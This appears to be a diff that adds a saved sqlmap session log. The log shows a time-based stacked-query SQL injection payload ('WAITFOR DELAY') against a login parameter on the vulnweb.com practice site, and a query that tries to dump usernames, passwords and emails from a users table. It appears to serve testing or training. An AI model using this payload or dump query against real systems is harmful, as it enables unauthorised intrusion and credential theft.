@@ -1,0 +1,39 @@
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.10.6.130#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 06:51:41 /2026-06-20/
+
+[06:51:45] [INFO] resuming back-end DBMS 'microsoft sql server' 
+[06:51:45] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('ASPSESSIONIDACAQRBTA=DHGGBKHCHDA...JJLLFEKBJN'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: tfUName (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: tfUName=admin';WAITFOR DELAY '0:0:5'--&tfUPass=pass
+---
+[06:51:46] [INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 8.1 or 2012 R2
+web application technology: ASP.NET, ASP, Django, Microsoft IIS 8.5
+back-end DBMS: Microsoft SQL Server 2014
+[06:51:46] [INFO] fetching SQL SELECT statement query output: 'SELECT uname, upass, email, realname FROM acuforum.dbo.users FOR XML RAW'
+[06:51:46] [INFO] the SQL query provided has more than one field. sqlmap will now unpack it into distinct queries to be able to retrieve the output even if we are going blind
+
+[06:51:46] [INFO] retrieved: [06:51:46] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
+[06:51:57] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+
+[06:51:58] [INFO] retrieved:   
+[06:51:58] [WARNING] the SQL query provided does not return any output
+[06:51:58] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 4 times
+[06:51:58] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/testasp.vulnweb.com'
+
+[*] ending @ 06:51:58 /2026-06-20/
+
